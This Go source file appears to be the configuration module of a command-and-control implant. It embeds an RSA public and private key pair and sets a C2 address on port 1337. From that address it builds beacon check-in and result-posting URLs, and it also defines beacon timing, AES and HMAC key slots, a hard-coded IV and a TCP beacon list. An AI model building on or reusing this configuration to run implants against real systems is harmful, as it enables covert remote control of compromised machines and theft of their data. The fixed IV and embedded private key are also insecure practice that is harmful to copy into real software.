package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+2BahW9xdciExeanNHcTiaJza5dlWdSd52lAt
qxWNpvm5FXnrmagD+IeClT5k8dnqOPEDuHaG3qdriXlYoy/OLwviG/dh14bWXx84/Bvr+b25Nt4g
dZVqwFKVNMDcxmtlI0bj7XxHlXid06E9eNlBMJmSWOJhMpjrp7eWjXxbWQIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAL7YFqFb3F1yITF5qc0dxOJonNrl
2VZ1J3naUC2rFY2m+bkVeeuZqAP4h4KVPmTx2eo48QO4dobep2uJeVijL84vC+Ib92HXhtZfHzj8
G+v5vbk23iB1lWrAUpU0wNzGa2UjRuPtfEeVeJ3ToT142UEwmZJY4mEymOunt5aNfFtZAgMBAAEC
gYAMVvGDpmplumLuDYVOp22bDBOUTcdTQUj3poeHpGfE3HaKIprbAnjsJM4yQc8ifMbPz7W5vVwg
lVXy7JUlh4uoJuZnkrd6qlPuQH/Nd3za17dLQi9RchnQ9T9BuTfjKF663zL5KizYlh4xaCnZPOd+
MrdBdfyP/XNduoCpK2Dl/wJBAP06h9+SUmbljESVROfHpCyEuZ2BA58TeC0TOJrzEQL4o+VqS2uf
/EluBDzKDskJFsbFf00xeEWEcxqYcj/5cd8CQQDA7sZ1XG2qaMSvkwwyZTyPgKZXFgdlbcvYvVrR
83iPKujBiohtrpNuq97ztceq2GfmtHABsPjA5YTp5Hhs7AnHAkEAm6pCYkZRj11m17Ym8JCCNLe2
XsMzVbOjOZpKPr5S48+y+NFZ4aQsc3tE8ZWIdz62GKTJt8tEUv+zvlKeUQNnYwJAYMDd4clCbe0w
heQ2f6dpYYXg5Vd0yhbv3XfIbfWthg68vyKcHHUqFpw2qP2GblUsdfQTH6YCeaogp7Md+XG9zQJA
XvNh7X0MHU5xWxJ1dPq1pa6P6VSm5Klq+UqtP4Wj6U79BlB3R5cowwJVX7jQ2ArTTz8RHhxOGm4+
Da7MQqd19g==
-----END PRIVATE KEY-----
	`)


	C2        = "172.17.0.1:1337"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
)

const (
	DebugMode = true
)